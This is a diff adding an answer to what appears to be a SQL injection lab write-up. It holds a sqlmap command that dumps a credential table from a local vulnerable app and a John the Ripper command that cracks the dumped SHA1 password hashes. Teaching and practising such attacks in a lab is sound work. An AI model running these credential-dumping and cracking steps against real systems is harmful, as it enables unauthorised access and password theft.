@@ -155,4 +155,24 @@ python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1&Password=1
 ````
 ![createpicture](./img2/getTableofDatabase.png)
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
+
+
 **Answer 3**:
+
+User Information
+````
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" -D sqllab_users -T credential --dump
+````
+![createpicture](./img2/usertable.png)
+
+Then Download John for window 
+Get the directory of file txt
+![createpicture](./img2/usrpwddirectory.png)
+
+Run the command:
+````
+john --incremental --fork=4 --format=Raw-SHA1 "C:\Users\Khanh\AppData\Local\Temp\sqlmapfm2ndib22896\sqlmaphashes-4rzcdov5.txt"
+````
+
+The result will occur the password of above users: 
+![createpicture](./img2/result1.png)
